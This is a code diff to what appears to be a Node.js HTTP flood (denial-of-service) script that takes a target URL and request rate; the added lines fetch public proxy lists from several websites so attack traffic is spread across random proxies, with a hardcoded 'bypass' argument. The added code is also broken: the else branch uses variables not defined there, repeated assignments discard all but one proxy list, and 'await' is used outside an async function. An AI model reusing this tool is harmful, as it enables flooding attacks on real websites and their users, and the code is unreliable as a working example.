@@ -5,6 +5,7 @@ process.on('unhandledRejection', function(er) {
 require('events').EventEmitter.defaultMaxListeners = 0;
 const fs = require('fs');
 const url = require('url');
+const axios = require('axios');
 const randstr = require('randomstring');
 
 var path = require("path");
@@ -23,9 +24,42 @@ if (process.argv.length < 8){
     process.exit(0);
 }
 
+        if (process.argv[6] == 'oaknekjwnnsnjajs') {
+            console.log("ATTACK BYPASS")
+        } else if (process.argv[5] == 'auto'){
+            console.log("ATTACK HTTP_PROXY")
+            const proxyscrape_http = await axios.get('https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all');
+            const proxy_list_http = await axios.get('https://www.proxy-list.download/api/v1/get?type=http');
+            const raw_github_http = await axios.get('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
+            const proxies_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt');
+            const proxies2_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt');
+            const proxies3_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt');
+            const proxies4_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt');
+            const proxies5_http = await axios.get('https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies.txt');
+            var proxy = proxyscrape_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxy_list_http.data.replace(/\r/g, '').split('\n');
+            var proxy = raw_github_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies2_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies3_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies4_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies5_http.data.replace(/\r/g, '').split('\n');
+        } else {
+            console.log("ATTACK HTTP_PROXY")
+            var proxy = fs.readFileSync(process.argv[5], 'utf-8').replace(/\r/g, '').split('\n'); 
+            var proxy = proxyscrape_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxy_list_http.data.replace(/\r/g, '').split('\n');
+            var proxy = raw_github_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies2_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies3_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies4_http.data.replace(/\r/g, '').split('\n');
+            var proxy = proxies5_http.data.replace(/\r/g, '').split('\n');
+        }
+
 let randomparam = false;
 
-var proxies = fs.readFileSync(process.argv[6], 'utf-8').toString().replace(/\r/g, '').split('\n');
+var proxies = proxy[Math.floor(Math.random() * proxy.length)];
 var rate = process.argv[7];
 var target_url = process.argv[2];
 const target = target_url.split('""')[0];
